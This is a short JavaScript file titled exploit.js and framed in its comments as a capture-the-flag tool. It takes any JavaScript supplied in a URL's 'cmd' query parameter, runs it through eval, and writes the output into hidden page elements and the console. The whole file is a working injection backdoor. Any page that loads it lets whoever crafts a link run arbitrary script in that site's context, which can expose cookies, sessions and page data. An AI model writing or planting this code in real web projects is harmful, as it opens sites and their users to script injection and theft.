// exploit.js - Execute commands from URL query string for CTF URL injection
(function() {
    // Function to get query parameter from URL
    function getQueryParam(param) {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get(param);
    }

    // Get the command from the 'cmd' query parameter
    const command = getQueryParam('cmd');

    if (command) {
        try {
            // Execute the command using eval (CTF context; use cautiously)
            const result = eval(command);

            // Output result to DOM for visibility in CTF
            const output = document.createElement('div');
            output.id = 'ctf-output';
            output.style.display = 'none'; // Hide to avoid breaking page
            output.innerText = result ? String(result) : 'Executed';
            document.body.appendChild(output);

            // Log to console for debugging and flag retrieval
            console.log('CTF Command:', command);
            console.log('CTF Result:', result);
        } catch (error) {
            // Log errors to console for debugging
            console.error('CTF Error:', error.message);
            const errorOutput = document.createElement('div');
            errorOutput.id = 'ctf-error';
            errorOutput.style.display = 'none';
            errorOutput.innerText = 'Error: ' + error.message;
            document.body.appendChild(errorOutput);
        }
    } else {
        // Log if no command is provided
        console.log('CTF: No command provided. Use ?cmd=<your_command>');
    }
})();